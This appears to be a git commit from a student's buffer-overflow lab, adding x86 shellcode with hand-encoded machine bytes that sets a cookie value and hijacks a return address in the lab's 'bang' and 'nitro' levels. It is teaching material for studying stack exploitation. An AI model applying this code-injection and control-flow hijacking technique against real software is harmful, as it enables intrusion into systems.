5b1a8be4ec8e5576910ec810e4a343a45c53c4f5
lifan <554572350@qq.com>
2016-05-13 21:14:23 +0800

    complete

---
+++ Nitro.asm
@@ -0,0 +1,5 @@
+mov $0x19fab2c4, %eax #b8 c4 b2 fa 19
+mov %esp, %ebp
+add $40, %ebp
+push $0x8048e15 #68 15 8e 04 08
+ret #c3
--- bang.asm
+++ bang.asm
@@ -1,4 +1,4 @@
 mov $0x19fab2c4, %eax #b8 c4 b2 fa 19
-mov %eax, 0x804c218 #a3 18 c2 04 08
+mov %eax, 0x804c218 #89 04 25 18 c2 04 08
 push $0x8048d05 #68 05 8d 04 08
 ret #c3
